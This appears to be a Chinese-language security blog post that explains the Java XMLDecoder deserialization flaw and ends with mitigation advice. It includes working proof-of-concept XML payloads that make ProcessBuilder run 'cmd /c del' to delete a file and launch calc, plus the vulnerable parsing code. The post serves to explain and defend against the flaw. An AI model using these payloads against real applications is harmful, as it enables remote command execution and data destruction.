---
title: Java XMLDecoder 反序列化高危漏洞深度剖析
date: 2025-10-30 14:42:34
category: 安全漏洞
tags: 安全漏洞
---


![](img/17-12-20-73076296.jpg)

近期在内部安全审计中，一个潜藏于JDK标准库 `XMLDecoder` 组件中的反序列化缺陷被揭露，其潜在的破坏力引发了我们的高度警觉。以下将通过两组具体的攻击情景，来全面揭示此漏洞可能带来的严重威胁。

#### 攻击情景一：借XMLDecoder实施文件系统破坏

攻击者可以精心构造一个恶意的XML配置文件，其内容如下所示。该文件利用了Java对象序列化的格式，意图执行系统命令。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_151" class="java.beans.XMLDecoder">
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="4">
            <void index="0">
                <string>cmd</string>
            </void>
            <void index="1">
                <string>/c</string>
            </void>
            <void index="2">
                <string>del</string>
            </void>
            <void index="3">
                <string>e:\1.txt</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
```

当应用程序使用 `XMLDecoder` 加载并解析上述文件时，便会触发其中定义的恶意操作。以下为一段存在风险的解析代码示例：

```java
private static void parseXmlFile() {
    File xmlFile = new File("E:\\xmldecoder.xml");
    XMLDecoder decoder = null;
    try {
        decoder = new XMLDecoder(new BufferedInputStream(new FileInputStream(xmlFile)));
        Object result = decoder.readObject(); // 危险操作在此执行
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        if (decoder != null) {
            decoder.close();
        }
    }
}
```

代码执行后，其效果等同于在Windows命令提示符中直接运行 `cmd /c del e:\1.txt`，指定的文件将被静默删除，揭示了该漏洞对本地数据完整性的直接侵害能力。

#### 攻击情景二：通过反序列化非法启动系统进程

此漏洞的危害远不止于文件操作。攻击者同样可以将恶意载荷内嵌于程序代码中，以字符串形式直接传递给 `XMLDecoder`。

```java
private static void parseXmlFromString() {
    String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\">" +
            "    <object class=\"java.lang.ProcessBuilder\">" +
            "        <array class=\"java.lang.String\" length=\"1\">" +
            "            <void index=\"0\">" +
            "                <string>calc</string>" +
            "            </void>" +
            "        </array>" +
            "        <void method=\"start\" />" +
            "    </object>" +
            "</java>";

    XMLDecoder decoder = null;
    try {
        decoder = new XMLDecoder(new ByteArrayInputStream(maliciousXml.getBytes()));
        Object result = decoder.readObject(); // 触发进程创建
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        if (decoder != null) {
            decoder.close();
        }
    }
}
```

运行上述代码，将成功调用系统计算器程序（calc.exe）。

![](img/17-12-20-29679880.jpg)

其核心机理在于，`XMLDecoder` 在反序列化过程中，会忠实重建XML中定义的 `ProcessBuilder` 对象并调用其 `start()` 方法。此方法与
`Runtime.exec()` 功能类似，是Java中创建本地系统进程的关键接口。

`ProcessBuilder` 的构造函数接受一个命令列表作为参数，这为攻击者提供了极大的灵活性：

```java
public ProcessBuilder(List<String> command) {
    if (command == null)
        throw new NullPointerException();
    this.command = command;
}
```

#### 核心结论与应对策略

综合以上分析，JDK内置的 `XMLDecoder` 在进行XML数据反序列化时，缺乏必要的安全审查机制，导致攻击者可借其构造任意
`ProcessBuilder` 命令，实现远程代码执行（RCE）。这相当于为攻击者打开了一条直达系统底层的通道。

需要特别指出的是，本文仅以 `ProcessBuilder` 为例进行演示，实际可利用的类和方法可能更多，攻击面更广。经确认，此安全隐患在JDK 8
update 151及之前的多个版本中均长期潜伏。

**紧急安全建议：**
在生产环境中，**应立即停止使用 `java.beans.XMLDecoder` 类来解析任何来自外部或不可信的XML数据源**
。应积极寻求并迁移至更安全、具备严格类型控制与输入验证的XML解析方案，例如使用诸如JAXB（配合安全配置）、DOM/SAX解析器等替代技术。

请广大开发者与安全团队务必重视此风险，立即开展组件排查与升级工作，以防患于未然。